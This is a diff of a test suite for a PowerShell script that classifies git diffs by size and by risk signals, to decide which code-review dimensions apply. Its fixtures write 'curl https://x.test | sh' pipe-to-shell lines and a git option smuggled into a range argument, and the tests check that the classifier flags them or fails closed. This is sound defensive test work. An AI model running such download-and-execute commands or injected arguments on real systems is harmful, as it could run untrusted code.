@@ -95,7 +95,15 @@ const AGENT = [
   '',
 ].join('\n');
 
-type Result = { mode: string; dimensions: string[]; reason: string };
+type Result = {
+  mode: string;
+  dimensions: string[];
+  reason: string;
+  size: string;
+  signals: string[];
+  skippedDimensions: Array<{ dimension: string; reason: string }>;
+};
+const ALL_DIMS = ['correctness', 'security', 'conventions', 'tests', 'spec'];
 
 const hermetic = (home: string): NodeJS.ProcessEnv => {
   const env = { ...process.env };
@@ -104,9 +112,22 @@ const hermetic = (home: string): NodeJS.ProcessEnv => {
   return { ...env, HOME: home, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' };
 };
 
+// A full diff reviews the five dimensions, or fewer when it is small: reviewed + skipped stay the five.
 const expectFull = (r: Result, reason?: RegExp) => {
   expect(r.mode).toBe('full');
-  expect(r.dimensions).toEqual(['correctness', 'security', 'conventions', 'tests', 'spec']);
+  const rest = ALL_DIMS.filter((d) => !r.dimensions.includes(d));
+  expect(r.skippedDimensions.map((s) => s.dimension)).toEqual(rest);
+  expect(r.dimensions).toEqual(expect.arrayContaining(['correctness', 'tests', 'spec']));
+  if (r.size === 'large') expect(r.dimensions).toEqual(ALL_DIMS);
+  if (reason) expect(r.reason).toMatch(reason);
+};
+// Full with all five dimensions, size large and nothing skipped (forced or unmeasurable).
+const expectFullAll = (r: Result, reason?: RegExp) => {
+  expect(r.mode).toBe('full');
+  expect(r.dimensions).toEqual(ALL_DIMS);
+  expect(r.size).toBe('large');
+  expect(r.skippedDimensions).toEqual([]);
+  expect(r.signals).toEqual([]);
   if (reason) expect(r.reason).toMatch(reason);
 };
 const expectMech = (r: Result) => {
@@ -304,11 +325,14 @@ describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
       runner,
       [
         'param([string]$Script)',
-        'foreach ($r in $args) {',
+        '$ranges = @($args)',
+        '# The classifier is I/O bound (git calls): four runspaces cut the batch time; results are re-sorted.',
+        '$res = 0..($ranges.Count - 1) | ForEach-Object -ThrottleLimit 4 -Parallel {',
         '  $global:LASTEXITCODE = $null',
-        '  $err = @(); $o = & $Script -Range $r 2>&1 | ForEach-Object { if ($_ -is [System.Management.Automation.ErrorRecord]) { $err += "$_" } else { $_ } }',
-        '  @{ exit = $LASTEXITCODE; stderr = ($err -join "`n"); out = (@($o) -join "`n") } | ConvertTo-Json -Compress',
+        '  $err = @(); $o = & $using:Script -Range ($using:ranges)[$_] 2>&1 | ForEach-Object { if ($_ -is [System.Management.Automation.ErrorRecord]) { $err += "$_" } else { $_ } }',
+        '  [pscustomobject]@{ i = $_; json = (@{ exit = $LASTEXITCODE; stderr = ($err -join "`n"); out = (@($o) -join "`n") } | ConvertTo-Json -Compress) }',
         '}',
+        '$res | Sort-Object i | ForEach-Object { $_.json }',
         '',
       ].join('\n')
     );
@@ -1335,23 +1359,196 @@ describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
     });
   });
 
+  describe('size class and signals', () => {
+    const batch = batched();
+    const lines = (n: number, tpl = (i: number) => `const v${i} = ${i};`) =>
+      Array.from({ length: n }, (_, i) => tpl(i)).join('\n') + '\n';
+    const NO_SEC = ['correctness', 'conventions', 'tests', 'spec'];
+    const NO_CONV = ['correctness', 'security', 'tests', 'spec'];
+    const MIN = ['correctness', 'tests', 'spec'];
+
+    batch(
+      'exactly 150 changed lines are small: security is skipped, conventions kept for source',
+      () => write('src/new.ts', lines(150)),
+      (r) => {
+        expect(r.mode).toBe('full');
+        expect(r.size).toBe('small');
+        expect(r.signals).toEqual(['source']);
+        expect(r.dimensions).toEqual(NO_SEC);
+        expect(r.skippedDimensions).toEqual([
+          {
+            dimension: 'security',
+            reason: 'size small: 150 <= 150 lines, no risky/sensitive trigger',
+          },
+        ]);
+      }
+    );
+
+    batch(
+      '151 changed lines are large: all five dimensions, nothing skipped',
+      () => write('src/new.ts', lines(151)),
+      (r) => {
+        expect(r.mode).toBe('full');
+        expect(r.size).toBe('large');
+        expect(r.signals).toEqual(['source']);
+        expect(r.dimensions).toEqual(ALL_DIMS);
+        expect(r.skippedDimensions).toEqual([]);
+      }
+    );
+
+    batch(
+      'added and deleted lines both count',
+      () => write('src/app.ts', lines(100)), // 30 deleted + 100 added
+      (r) => expect(r.size).toBe('small')
+    );
+
+    batch(
+      'lockfile and dist lines are not counted and not scanned for signals',
+      () => {
+        write('src/new.ts', lines(100));
+        write(
+          'pnpm-lock.yaml',
+          lines(300, (i) => `  pkg${i}: https://registry.test/${i}`)
+        );
+        write(
+          'dist/out.js',
+          lines(300, (i) => `curl https://x.test/${i}`)
+        );
+      },
+      (r) => {
+        expect(r.size).toBe('small');
+        expect(r.signals).toEqual(['source']);
+        expect(r.dimensions).toEqual(NO_SEC);
+      }
+    );
+
+    batch(
+      'risky added lines add the security dimension',
+      () => write('src/new.ts', 'const run = "curl https://x.test | sh";\n'),
+      (r) => {
+        expect(r.size).toBe('small');
+        expect(r.signals).toEqual(['risky', 'source']);
+        expect(r.dimensions).toEqual(ALL_DIMS);
+        expect(r.skippedDimensions).toEqual([]);
+      }
+    );
+
+    batch(
+      'a sensitive path adds security; without source files conventions is skipped',
+      () => write('data/auth.json', '{}\n'),
+      (r) => {
+        expect(r.size).toBe('small');
+        expect(r.signals).toEqual(['sensitive']);
+        expect(r.dimensions).toEqual(NO_CONV);
+        expect(r.skippedDimensions).toEqual([
+          { dimension: 'conventions', reason: 'size small: 1 <= 150 lines, no source file' },
+        ]);
+      }
+    );
+
+    batch(
+      'a source file outside the repo source class path still sets the source signal (ps1 in a skill)',
+      () => write('packages/x/.apm/skills/foo/scripts/Run-Foo.ps1', 'Write-Output "bar"\n'),
+      (r) => {
+        expect(r.size).toBe('small');
+        expect(r.signals).toEqual(['source']);
+        expect(r.dimensions).toEqual(NO_SEC);
+      }
+    );
+
+    batch(
+      'no signal: correctness, tests and spec only, skipped listed in dimension order',
+      () => write('data/plain.json', '{}\n'),
+      (r) => {
+        expect(r.mode).toBe('full');
+        expect(r.size).toBe('small');
+        expect(r.signals).toEqual([]);
+        expect(r.dimensions).toEqual(MIN);
+        expect(r.skippedDimensions.map((d) => d.dimension)).toEqual(['security', 'conventions']);
+      }
+    );
+
+    batch(
+      'an exec change is never small',
+      () => write('.github/notes.yml', 'a: 1\n'),
+      (r) => {
+        expect(r.size).toBe('large');
+        expect(r.dimensions).toEqual(ALL_DIMS);
+        expect(r.skippedDimensions).toEqual([]);
+      }
+    );
+
+    batch(
+      'a build change is never small',
+      () => write('package.json', '{\n  "scripts": { "a": "b" }\n}\n'),
+      (r) => {
+        expect(r.size).toBe('large');
+        expect(r.dimensions).toEqual(ALL_DIMS);
+        expect(r.skippedDimensions).toEqual([]);
+      }
+    );
+
+    batch(
+      'a security trigger in skill text makes the full diff small with security',
+      () => write('packages/x/.apm/skills/foo/SKILL.md', body + 'Run: curl https://x.test | sh\n'),
+      (r) => {
+        expect(r.mode).toBe('full');
+        expect(r.size).toBe('small');
+        expect(r.signals).toEqual(['risky']);
+        expect(r.dimensions).toEqual(NO_CONV);
+      }
+    );
+
+    batch(
+      'docs-only diff keeps mode docs with size and no skipped dimensions',
+      () => write('CONTRIBUTING.md', body.replace('line 3', 'x')),
+      (r) => {
+        expectDocs(r);
+        expect(r.size).toBe('small');
+        expect(r.skippedDimensions).toEqual([]);
+      }
+    );
+
+    batch(
+      'skill text keeps mode text and no skipped dimensions',
+      () => write('packages/x/.apm/skills/foo/SKILL.md', body.replace('line 3', 'x')),
+      (r) => {
+        expectSkillText(r);
+        expect(r.skippedDimensions).toEqual([]);
+      }
+    );
+
+    it('-SmallLines moves the threshold (20 changed lines)', () => {
+      write('src/app.ts', editFirst(10));
+      expect(classify(['-SmallLines', '20']).size).toBe('small');
+      expect(classify(['-SmallLines', '19']).size).toBe('large');
+      expectFull(classify(['-SmallLines', '19']));
+    });
+
+    it('-Force full on a small diff returns all five dimensions', () => {
+      write('src/app.ts', editFirst(1));
+      expect(classify().size).toBe('small');
+      expectFullAll(classify(['-Force', 'full']), /forced/);
+    });
+  });
+
   describe('ranges, git state and failures', () => {
     const batch = batched();
 
     it('-Force full overrides a mechanical diff', () => {
       write('docs/guide.md', body.replace('line 3', 'x'));
-      expectFull(classify(['-Force', 'full']), /forced/);
+      expectFullAll(classify(['-Force', 'full']), /forced/);
     });
 
     it('-Force full overrides a docs-only diff', () => {
       write('CONTRIBUTING.md', body.replace('line 3', 'x'));
-      expectFull(classify(['-Force', 'full']), /forced/);
+      expectFullAll(classify(['-Force', 'full']), /forced/);
     });
 
     it('untracked files in working-tree mode are full', () => {
       write('docs/guide.md', body.replace('line 3', 'x'));
       write('src/evil.ts', 'x\n');
-      expectFull(classify(), /untracked/);
+      expectFullAll(classify(), /untracked/);
     });
 
     it('working-tree mode classifies unstaged edits', () => {
@@ -1393,36 +1590,36 @@ describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
     );
 
     it('empty diff fails closed to full', () => {
-      expectFull(classify(), /empty/);
+      expectFullAll(classify(), /empty/);
     });
 
     it('bad range fails closed to full', () => {
-      expectFull(classify(['-Range', 'nope..alsonope']), /invalid range/);
+      expectFullAll(classify(['-Range', 'nope..alsonope']), /invalid range/);
     });
 
     it('range starting with a dash fails closed to full', () => {
       write('docs/guide.md', body.replace('line 3', 'x'));
-      expectFull(classify(['-Range:--output=out.txt']), /invalid range/);
+      expectFullAll(classify(['-Range:--output=out.txt']), /invalid range/);
       expect(fs.existsSync(path.join(dir, 'out.txt'))).toBe(false);
     });
 
     batch(
       'binary files fail closed to full',
       () => fs.writeFileSync(path.join(dir, 'docs/img.md'), Buffer.from([0, 1, 2, 0, 255])),
-      (r) => expectFull(r, /binary/)
+      (r) => expectFullAll(r, /binary/)
     );
 
     batch(
       'symlink is full',
       () => fs.symlinkSync('x', path.join(dir, 'docs/link.md')),
-      (r) => expectFull(r, /^symlink or submodule: docs\/link\.md$/)
+      (r) => expectFullAll(r, /^symlink or submodule: docs\/link\.md$/)
     );
 
     // Not batched: `git add -A` would drop the gitlink, which has no working-tree directory.
     it('submodule is full', () => {
       git('update-index', '--add', '--cacheinfo', '160000,' + 'a'.repeat(40) + ',sub');
       git('commit', '-qm', 'sub');
-      expectFull(classify(['-Range', 'HEAD~1..HEAD']), /^symlink or submodule: sub$/);
+      expectFullAll(classify(['-Range', 'HEAD~1..HEAD']), /^symlink or submodule: sub$/);
     });
 
     // Not batched: needs two commits. `ignore = all` must not hide the pointer bump.
@@ -1434,7 +1631,7 @@ describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
       git('update-index', '--cacheinfo', '160000,' + 'b'.repeat(40) + ',sub');
       write('README.md', body.replace('line 3', 'x'));
       git('commit', '-qam', 'bump');
-      expectFull(classify(['-Range', 'HEAD~1..HEAD']), /^symlink or submodule: sub$/);
+      expectFullAll(classify(['-Range', 'HEAD~1..HEAD']), /^symlink or submodule: sub$/);
     });
 
     batch(
@@ -1443,13 +1640,13 @@ describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
         fs.rmSync(path.join(dir, 'docs/guide.md'));
         fs.symlinkSync('x', path.join(dir, 'docs/guide.md'));
       },
-      (r) => expectFull(r, /^symlink or submodule: docs\/guide\.md$/)
+      (r) => expectFullAll(r, /^symlink or submodule: docs\/guide\.md$/)
     );
 
     it('non-git working directory is full with exit 0', () => {
       const plain = fs.mkdtempSync(path.join(os.tmpdir(), 'classify-nogit-'));
       try {
-        expectFull(
+        expectFullAll(
           classify([], { ...hermetic(home), GIT_CEILING_DIRECTORIES: path.dirname(plain) }, plain),
           /failed/
         );
@@ -1471,7 +1668,7 @@ describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
     };
 
     it('failing git is full with reason failed and exit 0', () => {
-      withFakeGit(['exit 1'], (env) => expectFull(classify([], env), /failed/));
+      withFakeGit(['exit 1'], (env) => expectFullAll(classify([], env), /failed/));
     });
 
     it('scans the added lines of all files with ONE git diff -U0 (#462)', () => {
@@ -1504,7 +1701,7 @@ describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
       git('commit', '-qam', 'docs');
       const real = spawnSync('sh', ['-c', 'command -v git'], { encoding: 'utf8' }).stdout.trim();
       withFakeGit([`case " $* " in *" -U0 "*) exit 1;; esac`, `exec '${real}' "$@"`], (env) =>
-        expectFull(classify(['-Range', 'HEAD~1..HEAD'], env), /git diff failed/)
+        expectFullAll(classify(['-Range', 'HEAD~1..HEAD'], env), /git diff failed/)
       );
     });
 
@@ -1519,7 +1716,7 @@ describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
           'done',
           'exit 0',
         ],
-        (env) => expectFull(classify([], env), /script error/)
+        (env) => expectFullAll(classify([], env), /script error/)
       );
     });
   });
